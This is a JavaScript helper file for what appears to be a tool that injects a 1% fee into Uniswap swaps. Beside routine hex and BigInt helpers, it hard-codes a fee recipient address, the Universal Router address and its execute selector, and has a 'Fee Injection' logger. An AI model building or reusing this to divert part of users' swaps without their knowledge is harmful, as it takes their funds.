// utils.js - Mathematical helpers and utilities

/**
 * Calculate 1% of a BigInt value
 * @param {BigInt|string} amount - The original amount (BigInt or hex string)
 * @returns {BigInt} - 1% of the amount
 */
function calculateOnePercent(amount) {
  // Convert to BigInt if it's a hex string
  const bigIntAmount = typeof amount === 'string' ? hexToBigInt(amount) : amount;
  
  // Calculate 1% (divide by 100)
  return bigIntAmount / 100n;
}

/**
 * Convert hex string to BigInt
 * @param {string} hex - Hex string (with or without 0x prefix)
 * @returns {BigInt} - BigInt representation
 */
function hexToBigInt(hex) {
  if (typeof hex !== 'string') return 0n;
  return BigInt(hex.startsWith('0x') ? hex : '0x' + hex);
}

/**
 * Convert BigInt to hex string
 * @param {BigInt} value - BigInt value
 * @returns {string} - Hex string with 0x prefix
 */
function bigIntToHex(value) {
  return '0x' + value.toString(16);
}

/**
 * Pad hex string to specified length
 * @param {string} hex - Hex string
 * @param {number} length - Target length (in bytes)
 * @returns {string} - Padded hex string
 */
function padHex(hex, length) {
  const cleanHex = hex.replace('0x', '');
  return '0x' + cleanHex.padStart(length * 2, '0');
}

/**
 * Check if a hex string represents a valid Ethereum address
 * @param {string} address - Address to validate
 * @returns {boolean} - True if valid address
 */
function isValidAddress(address) {
  return /^0x[a-fA-F0-9]{40}$/.test(address);
}

/**
 * Log injection details for debugging
 * @param {string} tokenAddress - Token being swapped
 * @param {BigInt} originalAmount - Original swap amount
 * @param {BigInt} feeAmount - Calculated fee amount
 */
function logInjection(tokenAddress, originalAmount, feeAmount) {
  console.log('🔥 Uniswap Fee Injection:', {
    token: tokenAddress,
    originalAmount: originalAmount.toString(),
    feeAmount: feeAmount.toString(),
    feePercentage: '1%',
    recipient: '0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed'
  });
}

// Utils Configuration
const UTILS_UNIVERSAL_ROUTER_ADDRESS = '0x66a9893cc07d91d95644aedd05d03f95e1dba8af'; // Uniswap v4 Universal Router
const UTILS_EXECUTE_FUNCTION_SELECTOR = '0x24856bc3';
const UTILS_FEE_RECIPIENT = '0x237D4cfE852DB65d6b170f4F9BDcB09acA2375Ed';

// Export utilities for use in other modules
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    calculateOnePercent,
    hexToBigInt,
    bigIntToHex,
    padHex,
    isValidAddress,
    logInjection
  };
} 